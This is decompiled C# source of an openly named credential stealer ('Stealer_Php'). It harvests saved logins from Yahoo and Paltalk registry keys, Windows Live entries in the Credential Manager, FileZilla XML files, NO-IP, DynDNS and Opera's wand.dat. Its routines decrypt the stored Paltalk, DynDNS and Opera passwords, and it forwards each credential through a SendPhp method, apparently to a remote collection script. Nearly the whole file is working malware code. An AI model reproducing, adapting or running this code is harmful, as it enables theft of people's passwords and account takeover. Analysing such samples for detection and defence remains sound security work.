using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Stealer_Php.My;

namespace Stealer_Php;

[StandardModule]
internal sealed class p
{
	internal struct CREDENTIAL
	{
		public int Flags;

		public int Type;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string TargetName;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string Comment;

		public long LastWritten;

		public int CredentialBlobSize;

		public IntPtr CredentialBlob;

		public int Persist;

		public int AttributeCount;

		public IntPtr Attributes;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string TargetAlias;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string UserName;
	}

	public static string OL;

	private static byte[] Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA = new byte[11]
	{
		131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
		255
	};

	private static byte[] OMNlZkzWnLmF12iySjKpWNXT8A2iySjKpWNXT8At9X9O6RKBWsQAxWorEKcKb4G0 = new byte[4] { 0, 0, 0, 8 };

	private static string xWorEKcKb4G42CyhCx7VXnhYMAGJfHQjKXQGcfAGJfHQjKXQGcfAsnqdTXvLcq9A = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string DOutput;

	public static void Yahoo()
	{
		try
		{
			string[] subKeyNames = Registry.CurrentUser.OpenSubKey("Software\\Yahoo\\Profiles")!.GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				OL = OL + "\r\nApplication: Yahoo\r\nUrl: http://Yahoo.com\r\nUsername: " + text + "\r\nPassword: \r\n";
				MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("3"), "http://Yahoo.com", text, "Nothing");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CredEnumerateW(string filter, uint flag, out uint count, out IntPtr pCredentials);

	public static void Msn()
	{
		checked
		{
			try
			{
				IntPtr pCredentials = IntPtr.Zero;
				if (!CredEnumerateW("WindowsLive:name=*", 0u, out var count, out pCredentials))
				{
					return;
				}
				int num = (int)(unchecked((long)count) - 1L);
				for (int i = 0; i <= num; i++)
				{
					try
					{
						OL += "Url: http://hotmail.com\r\n";
						CREDENTIAL cREDENTIAL = (CREDENTIAL)Marshal.PtrToStructure(Marshal.ReadIntPtr(pCredentials, IntPtr.Size * i), typeof(CREDENTIAL));
						OL = OL + "\r\nApplication: MSN\r\nUsername: " + cREDENTIAL.UserName + "\r\n";
						try
						{
							OL = OL + "Password: " + Marshal.PtrToStringBSTR(cREDENTIAL.CredentialBlob) + "\r\n";
							MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("2"), "http://fr.msn.com/", cREDENTIAL.UserName, Marshal.PtrToStringBSTR(cREDENTIAL.CredentialBlob));
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							OL += "Password: \r\n";
							MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("2"), "http://fr.msn.com/", cREDENTIAL.UserName, "Nothing");
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void P1()
	{
		try
		{
			string[] array = Strings.Split(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml"), "<Server>", -1, (CompareMethod)0);
			string[] array2 = array;
			foreach (string text in array2)
			{
				string urlLogin = "";
				string login = "";
				string mDP = "";
				string[] array3 = Strings.Split(text, "\r\n", -1, (CompareMethod)0);
				string[] array4 = array3;
				foreach (string text2 in array4)
				{
					if (text2.Contains("<Host>"))
					{
						OL = OL + "\r\nApplication: FileZilla\r\nHost: " + Strings.Split(Strings.Split(text2, "<Host>", -1, (CompareMethod)0)[1], "</Host>", -1, (CompareMethod)0)[0] + "\r\n";
						urlLogin = Strings.Split(Strings.Split(text2, "<Host>", -1, (CompareMethod)0)[1], "</Host>", -1, (CompareMethod)0)[0];
					}
					if (text2.Contains("<User>"))
					{
						OL = OL + "Username: " + Strings.Split(Strings.Split(text2, "<User>", -1, (CompareMethod)0)[1], "</User>", -1, (CompareMethod)0)[0] + "\r\n";
						login = Strings.Split(Strings.Split(text2, "<User>", -1, (CompareMethod)0)[1], "</User>", -1, (CompareMethod)0)[0];
					}
					if (text2.Contains("<Pass>"))
					{
						OL = OL + "Password: " + Strings.Split(Strings.Split(text2, "<Pass>", -1, (CompareMethod)0)[1], "</Pass>", -1, (CompareMethod)0)[0] + "\r\n\r\n";
						mDP = Strings.Split(Strings.Split(text2, "<Pass>", -1, (CompareMethod)0)[1], "</Pass>", -1, (CompareMethod)0)[0].ToString();
					}
				}
				MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("15"), urlLogin, login, mDP);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] array5 = Strings.Split(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml"), "<Server>", -1, (CompareMethod)0);
			string[] array6 = array5;
			foreach (string text3 in array6)
			{
				string urlLogin2 = "";
				string login2 = "";
				string mDP2 = "";
				string[] array7 = Strings.Split(text3, "\r\n", -1, (CompareMethod)0);
				string[] array8 = array7;
				foreach (string text4 in array8)
				{
					if (text4.Contains("<Host>"))
					{
						OL = OL + "\r\nApplication: FileZilla\r\nHost: " + Strings.Split(Strings.Split(text4, "<Host>", -1, (CompareMethod)0)[1], "</Host>", -1, (CompareMethod)0)[0] + "\r\n";
						urlLogin2 = Strings.Split(Strings.Split(text4, "<Host>", -1, (CompareMethod)0)[1], "</Host>", -1, (CompareMethod)0)[0];
					}
					if (text4.Contains("<User>"))
					{
						OL = OL + "Username: " + Strings.Split(Strings.Split(text4, "<User>", -1, (CompareMethod)0)[1], "</User>", -1, (CompareMethod)0)[0] + "\r\n";
						login2 = Strings.Split(Strings.Split(text4, "<User>", -1, (CompareMethod)0)[1], "</User>", -1, (CompareMethod)0)[0];
					}
					if (text4.Contains("<Pass>"))
					{
						OL = OL + "Password:" + Strings.Split(Strings.Split(text4, "<Pass>", -1, (CompareMethod)0)[1], "</Pass>", -1, (CompareMethod)0)[0] + "\r\n\r\n";
						mDP2 = Strings.Split(Strings.Split(text4, "<Pass>", -1, (CompareMethod)0)[1], "</Pass>", -1, (CompareMethod)0)[0];
					}
				}
				MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("15"), urlLogin2, login2, mDP2);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void P2()
	{
		try
		{
			string keyName = "HKEY_CURRENT_USER\\Software\\Vitalwerks\\DUC\\v4";
			string text = Conversions.ToString(Registry.GetValue(keyName, "UserName", ""));
			string text2 = Conversions.ToString(Registry.GetValue(keyName, "UpdateList", ""));
			if (Operators.CompareString(text, "", false) != 0)
			{
				OL = OL + "\r\nApplication: NO-IP\r\nDNS: " + text + "\r\nPassword: " + text2 + "\r\n\r\n";
				MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("1"), "https://www.noip.com", text, text2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	public static string HWD()
	{
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void paltalk()
	{
		checked
		{
			try
			{
				char[] array = HWD().ToCharArray();
				RegistryKey currentUser = Registry.CurrentUser;
				currentUser = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
				string[] subKeyNames = currentUser.GetSubKeyNames();
				currentUser.Close();
				string[] array2 = subKeyNames;
				int num = default(int);
				int num2 = default(int);
				int num3 = default(int);
				foreach (string text in array2)
				{
					string text2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + text, "pwd", ""));
					char[] array3 = text2.ToCharArray();
					string[] array4 = new string[(int)Math.Round((double)text2.Length / 4.0) + 1];
					while (num <= Information.UBound((Array)array3, 1) - 4)
					{
						if (num < Information.UBound((Array)array3, 1) - 4)
						{
							array4[num2] = Conversions.ToString(array3[num]) + Conversions.ToString(array3[num + 1]) + Conversions.ToString(array3[num + 2]);
						}
						num += 4;
						num2++;
					}
					string text3 = "";
					string text4 = text;
					int j = 0;
					for (int length = text4.Length; j < length; j++)
					{
						char c = text4[j];
						text3 += Conversions.ToString(c);
						if (num3 <= Information.UBound((Array)array, 1))
						{
							text3 += Conversions.ToString(array[num3]);
						}
						num3++;
					}
					text3 = text3 + text3 + text3;
					char[] array5 = text3.ToCharArray();
					string text5 = "";
					text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text3.Substring(text3.Length - 1, 1)))));
					int num4 = Information.UBound((Array)array4, 1);
					for (int k = 1; k <= num4; k++)
					{
						if (array4[k] != null)
						{
							char c2 = Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[k]) - (double)k - (double)Strings.Asc(array5[k - 1]) - 122.0));
							text5 += Conversions.ToString(c2);
						}
					}
					OL = OL + "\r\nApplication: Paltalk\r\nURL: http://Paltalk.com\r\nUsername: " + text + "\r\nPassword: " + text5 + "\r\n\r\n";
					MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("6"), "http://Paltalk.com", text, text5);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void dyn()
	{
		checked
		{
			try
			{
				string text = Strings.Replace(Interaction.Environ("ALLUSERSPROFILE") + "\\", "\\\\", "\\", 1, -1, (CompareMethod)0);
				string path = text + "DynDNS\\Updater\\config.dyndns";
				if (!File.Exists(path))
				{
					return;
				}
				Array array = File.ReadAllLines(path);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = array.GetEnumerator();
					string text2;
					string text3 = default(string);
					do
					{
						if (enumerator.MoveNext())
						{
							text2 = Conversions.ToString(enumerator.Current);
							if (Strings.InStr(text2.ToLower(), "username=", (CompareMethod)0) > 0)
							{
								text3 = Strings.Split(text2, "=", -1, (CompareMethod)0)[1];
							}
							continue;
						}
						return;
					}
					while (Strings.InStr(text2.ToLower(), "password=", (CompareMethod)0) <= 0);
					string text4 = Strings.Split(text2, "=", -1, (CompareMethod)0)[1];
					int num = Strings.Len(text4);
					string text5 = default(string);
					for (int i = 1; i <= num; i += 2)
					{
						text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val("&H" + Strings.Mid(text4, i, 2)))));
					}
					int num2 = Strings.Len(text5);
					int num3 = default(int);
					for (int j = 1; j <= num2; j++)
					{
						StringType.MidStmtStr(ref text5, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text5, j, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num3 + 1, 1)))));
						unchecked
						{
							num3 = checked(num3 + 1) % 8;
						}
					}
					if (text3.Length != 0)
					{
						OL = OL + "\r\nApplication: DynDNS\r\nUrl: http://DynDns.com\r\nUsername: " + text3 + "\r\nPassword: " + text5 + "\r\n\r\n";
						MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("9"), "http://DynDns.com", text3, text5);
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void GetOpera()
	{
		if (File.Exists(xWorEKcKb4G42CyhCx7VXnhYMAGJfHQjKXQGcfAGJfHQjKXQGcfAsnqdTXvLcq9A + "\\Opera\\Opera\\wand.dat"))
		{
			xWorEKcKb4G42CyhCx7VXnhYMAGJfHQjKXQGcfAGJfHQjKXQGcfAsnqdTXvLcq9A += "\\Opera\\Opera\\wand.dat";
		}
		else if (File.Exists(xWorEKcKb4G42CyhCx7VXnhYMAGJfHQjKXQGcfAGJfHQjKXQGcfAsnqdTXvLcq9A + "\\Opera\\Opera\\profile\\wand.dat"))
		{
			xWorEKcKb4G42CyhCx7VXnhYMAGJfHQjKXQGcfAGJfHQjKXQGcfAsnqdTXvLcq9A += "\\Opera\\Opera\\profile\\wand.dat";
		}
		checked
		{
			try
			{
				byte[] array = File.ReadAllBytes(xWorEKcKb4G42CyhCx7VXnhYMAGJfHQjKXQGcfAGJfHQjKXQGcfAsnqdTXvLcq9A);
				int num = 0;
				int num2 = array.Length - 5;
				for (int i = 0; i <= num2; i++)
				{
					if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
					{
						num = array[i + 15];
						byte[] array2 = new byte[8];
						byte[] array3 = new byte[num - 1 + 1];
						Array.Copy(array, i + 4, array2, 0, array2.Length);
						Array.Copy(array, i + 16, array3, 0, array3.Length);
						DOutput = Conversions.ToString(Operators.AddObject((object)DOutput, Operators.ConcatenateObject(decrypt2_method(array2, array3), (object)"\r\n")));
						i += 11 + num;
					}
				}
				string[] array4 = Strings.Split(DOutput, "\r\n", -1, (CompareMethod)0);
				int num3 = array4.Length - 1;
				for (int j = 0; j <= num3; j++)
				{
					string text = FL(array4[j]);
					string text2 = "";
					string text3 = "";
					string text4 = "";
					if (!(text.ToLower().StartsWith("http://") | text.ToLower().StartsWith("https://")))
					{
						continue;
					}
					text2 = text;
					if (j + 2 < array4.Length)
					{
						int num4 = j + 1;
						int num5 = j + 2;
						for (int k = num4; k <= num5; k++)
						{
							string text5 = array4[k];
							if (text5.ToLower().StartsWith("http://") | text5.ToLower().StartsWith("https://"))
							{
								break;
							}
							if (k == j + 2)
							{
								text3 = FL(text5);
							}
						}
					}
					if (j + 4 < array4.Length)
					{
						int num6 = j + 1;
						int num7 = j + 4;
						for (int l = num6; l <= num7; l++)
						{
							string text6 = array4[l];
							if (text6.ToLower().StartsWith("http://") | text6.ToLower().StartsWith("https://"))
							{
								break;
							}
							if (l == j + 4)
							{
								text4 = FL(text6);
							}
						}
					}
					OL = OL + "\r\nApplication: Opera\r\nUrl: " + text2 + "\r\nUsername: " + text3 + "\r\nPassword: " + text4 + "\r\n\r\n";
					MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("13"), text2, text3, text4);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string FL(string s)
	{
		string text = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=";
		string text2 = "";
		int i = 0;
		for (int length = s.Length; i < length; i = checked(i + 1))
		{
			string text3 = Conversions.ToString(s[i]);
			if (text.Contains(text3.ToLower()))
			{
				text2 += text3;
			}
		}
		return text2;
	}

	public static object decrypt2_method(byte[] key, byte[] encrypt_data)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				mD5CryptoServiceProvider.Initialize();
				byte[] array = new byte[Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA.Length + (key.Length - 1) + 1];
				Array.Copy(Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA, array, Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA.Length);
				Array.Copy(key, 0, array, Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA.Length, key.Length);
				byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
				array = new byte[array2.Length + Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA.Length + (key.Length - 1) + 1];
				Array.Copy(array2, array, array2.Length);
				Array.Copy(Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA, 0, array, array2.Length, Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA.Length);
				Array.Copy(key, 0, array, array2.Length + Y3iz7ZfVOBq20Y3iz7ZfVOBq2AgZDKrLSJc9RJAlsrPiwHJyMQcAlsrPiwHJyMQA.Length, key.Length);
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				byte[] array3 = new byte[24];
				byte[] array4 = new byte[8];
				Array.Copy(array2, array3, array2.Length);
				Array.Copy(sourceArray, 0, array3, array2.Length, 8);
				Array.Copy(sourceArray, 8, array4, 0, 8);
				tripleDESCryptoServiceProvider.Key = array3;
				tripleDESCryptoServiceProvider.IV = array4;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				byte[] bytes = cryptoTransform.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length);
				return Encoding.Unicode.GetString(bytes);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
